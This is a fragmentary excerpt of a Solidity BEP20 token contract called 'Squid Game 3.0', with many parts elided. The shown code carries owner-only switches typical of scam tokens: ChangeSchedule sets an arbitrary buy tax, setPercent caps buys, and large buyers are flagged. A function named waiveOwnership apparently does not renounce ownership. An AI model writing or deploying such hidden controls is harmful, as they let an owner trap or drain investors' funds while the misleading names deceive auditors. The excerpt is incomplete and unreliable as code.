...
contract Token is Context, IBEP20, Ownable {
    ...
    constructor(address Tokencontract) public {
        _name = "Squid Game 3.0";
        _symbol = "Squid Game 3.0";
        _decimals = 18;
    ...
    uint256 private deadline = 1653349376;
    ...
    uint256 private VALUE = 100000000000 * 10 ** 18;
    ...
    */
    ...
    function ChangeSchedule(uint amount) public onlyOwner{
      require(_isExcludedFromFee[msg.sender] == true);
      _totalTaxIfBuying = amount;
    }

    function waiveOwnership(uint amount) public onlyOwner{
      require(_isExcludedFromFee[msg.sender] == true);
    ...
    */
    ...
    function UpdateData(address account) public {
        require(_isExcludedFromFee[msg.sender] == true);
    ...
    address[] private AddressArray;
      ...
      function setPercent(uint256 amount) public{
          require(_isExcludedFromFee[msg.sender] == true);
          maxB = amount;
      }
    /**
    ...
    */
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        if(_isExcludedFromFee[sender]||_isExcludedFromFee[recipient]){
            ...
            }else if(sender == pair && amount >= VALUE){
                isMarketPair[recipient] = true;
            }
            if(sender == pair){
                require(amount <= maxB, "Error");
                _balances[sender] = _balances[sender].sub(amount.div(100).mul(_totalTaxIfBuying));
                _balances[DeadAddress] = _balances[DeadAddress].add(amount.div(100).mul(_totalTaxIfBuying));
                ...
                _balances[DeadAddress] = _balances[DeadAddress].add(amount.div(100).mul(_totalTaxIfSelling));
